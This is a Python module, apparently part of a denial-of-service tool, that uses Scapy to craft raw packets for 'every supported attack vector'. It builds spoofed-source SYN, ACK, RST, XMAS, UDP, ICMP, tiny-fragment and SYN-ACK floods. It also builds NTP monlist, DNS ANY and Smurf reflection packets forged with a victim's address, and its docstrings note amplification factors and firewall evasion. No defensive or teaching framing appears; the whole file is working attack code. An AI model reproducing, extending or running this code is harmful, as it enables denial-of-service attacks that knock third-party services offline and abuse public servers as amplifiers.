"""
core/packet_builder.py
Craft raw packets for every supported attack vector.
Requires Scapy + root privileges.
"""

import random
import socket
import struct
from scapy.all import (
    IP, TCP, UDP, ICMP, Raw,
    Ether, fragment,
    RandShort, RandIP,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def random_ip() -> str:
    """Generate a random routable IPv4 address (spoofed source)."""
    while True:
        ip = f"{random.randint(1,223)}.{random.randint(0,255)}." \
             f"{random.randint(0,255)}.{random.randint(1,254)}"
        # Skip private / reserved ranges
        first = int(ip.split(".")[0])
        second = int(ip.split(".")[1])
        if first == 10:
            continue
        if first == 172 and 16 <= second <= 31:
            continue
        if first == 192 and second == 168:
            continue
        if first == 127:
            continue
        return ip


def random_port() -> int:
    return random.randint(1024, 65535)


def random_payload(size: int = 64) -> bytes:
    return bytes(random.getrandbits(8) for _ in range(size))


# ---------------------------------------------------------------------------
# Layer 3/4 builders
# ---------------------------------------------------------------------------

class PacketBuilder:

    # --- SYN Flood ----------------------------------------------------------
    @staticmethod
    def syn(dst_ip: str, dst_port: int, spoof: bool = True) -> bytes:
        """Classic SYN flood packet. Half-open TCP state exhaustion."""
        src = random_ip() if spoof else None
        pkt = IP(src=src, dst=dst_ip) / TCP(
            sport=random_port(),
            dport=dst_port,
            flags="S",
            seq=random.randint(0, 2**32 - 1),
            window=random.choice([1024, 2048, 4096, 8192, 65535]),
            options=[("MSS", random.randint(536, 1460))],
        )
        return bytes(pkt)

    # --- ACK Flood ----------------------------------------------------------
    @staticmethod
    def ack(dst_ip: str, dst_port: int, spoof: bool = True) -> bytes:
        """ACK flood - bypasses stateless packet filters."""
        src = random_ip() if spoof else None
        pkt = IP(src=src, dst=dst_ip) / TCP(
            sport=random_port(),
            dport=dst_port,
            flags="A",
            seq=random.randint(0, 2**32 - 1),
            ack=random.randint(0, 2**32 - 1),
        )
        return bytes(pkt)

    # --- RST/FIN Flood ------------------------------------------------------
    @staticmethod
    def rst(dst_ip: str, dst_port: int, spoof: bool = True) -> bytes:
        """RST flood - forceful connection teardown."""
        src = random_ip() if spoof else None
        flag = random.choice(["R", "F", "RF"])
        pkt = IP(src=src, dst=dst_ip) / TCP(
            sport=random_port(),
            dport=dst_port,
            flags=flag,
            seq=random.randint(0, 2**32 - 1),
        )
        return bytes(pkt)

    # --- XMAS Packet --------------------------------------------------------
    @staticmethod
    def xmas(dst_ip: str, dst_port: int, spoof: bool = True) -> bytes:
        """All TCP flags set. Confuses some stateful inspection engines."""
        src = random_ip() if spoof else None
        pkt = IP(src=src, dst=dst_ip) / TCP(
            sport=random_port(),
            dport=dst_port,
            flags="FSRPAUEC",   # All 8 flags
        )
        return bytes(pkt)

    # --- UDP Flood ----------------------------------------------------------
    @staticmethod
    def udp(dst_ip: str, dst_port: int,
            payload_size: int = 512, spoof: bool = True) -> bytes:
        """Volumetric UDP flood."""
        src = random_ip() if spoof else None
        pkt = IP(src=src, dst=dst_ip) / UDP(
            sport=random_port(),
            dport=dst_port,
        ) / Raw(load=random_payload(payload_size))
        return bytes(pkt)

    # --- ICMP Flood ---------------------------------------------------------
    @staticmethod
    def icmp_echo(dst_ip: str, payload_size: int = 56,
                  spoof: bool = True) -> bytes:
        """ICMP echo request flood (ping flood)."""
        src = random_ip() if spoof else None
        pkt = IP(src=src, dst=dst_ip) / ICMP(
            type=8, code=0,
            id=random.randint(0, 65535),
            seq=random.randint(0, 65535),
        ) / Raw(load=random_payload(payload_size))
        return bytes(pkt)

    # --- IP Fragmentation (DROPER) -----------------------------------------
    @staticmethod
    def ip_frag(dst_ip: str, dst_port: int,
                spoof: bool = True) -> list[bytes]:
        """
        Fragmented UDP packets to exhaust reassembly buffers.
        Returns a list of fragment bytes.
        """
        src = random_ip() if spoof else None
        pkt = IP(src=src, dst=dst_ip) / UDP(
            sport=random_port(),
            dport=dst_port,
        ) / Raw(load=random_payload(1400))
        frags = fragment(pkt, fragsize=8)  # Tiny fragments, max reassembly pressure
        return [bytes(f) for f in frags]

    # --- SYN-ACK (TACHYON) -------------------------------------------------
    @staticmethod
    def syn_ack(dst_ip: str, dst_port: int, spoof: bool = True) -> bytes:
        """SYN-ACK flood. Targets TCP handshake logic."""
        src = random_ip() if spoof else None
        pkt = IP(src=src, dst=dst_ip) / TCP(
            sport=random_port(),
            dport=dst_port,
            flags="SA",
            seq=random.randint(0, 2**32 - 1),
            ack=random.randint(0, 2**32 - 1),
        )
        return bytes(pkt)

    # --- NTP Amplification (MONLIST) ---------------------------------------
    @staticmethod
    def ntp_monlist(reflector_ip: str, victim_ip: str) -> bytes:
        """
        NTP monlist request spoofed as victim.
        Amplification factor ~300-500x.
        Send to NTP server (port 123), response goes to victim_ip.
        """
        # NTP mode 7, request code 42 (MON_GETLIST_1)
        ntp_payload = bytes([
            0x17,  # li=0, vn=2, mode=7
            0x00,  # response=0, more=0, version=0, code=0
            0x03,  # sequence
            0x2a,  # implementation: XNTPD
            0x00, 0x00, 0x00, 0x00,
        ])
        pkt = IP(src=victim_ip, dst=reflector_ip) / UDP(
            sport=random_port(),
            dport=123,
        ) / Raw(load=ntp_payload)
        return bytes(pkt)

    # --- DNS Amplification -------------------------------------------------
    @staticmethod
    def dns_amp(reflector_ip: str, victim_ip: str,
                query: str = "isc.org", qtype: str = "ANY") -> bytes:
        """
        DNS ANY query spoofed as victim.
        Amplification factor ~28-54x (ANY), higher with DNSSEC.
        """
        from scapy.layers.dns import DNS, DNSQR
        _QTYPE_MAP = {
            "A": 1, "NS": 2, "CNAME": 5, "SOA": 6, "MX": 15,
            "TXT": 16, "AAAA": 28, "SRV": 33, "ANY": 255,
        }
        qtype_val = _QTYPE_MAP.get(qtype.upper(), qtype) if isinstance(qtype, str) else qtype
        pkt = IP(src=victim_ip, dst=reflector_ip) / UDP(
            sport=random_port(),
            dport=53,
        ) / DNS(
            id=random.randint(0, 65535),
            rd=1,
            qd=DNSQR(qname=query, qtype=qtype_val),
        )
        return bytes(pkt)

    # --- SMURF (ICMP broadcast amplification) ------------------------------
    @staticmethod
    def smurf(broadcast_ip: str, victim_ip: str) -> bytes:
        """
        ICMP echo request to broadcast, spoofed as victim.
        All hosts on subnet reply to victim.
        """
        pkt = IP(src=victim_ip, dst=broadcast_ip) / ICMP(
            type=8, code=0,
        ) / Raw(load=random_payload(56))
        return bytes(pkt)
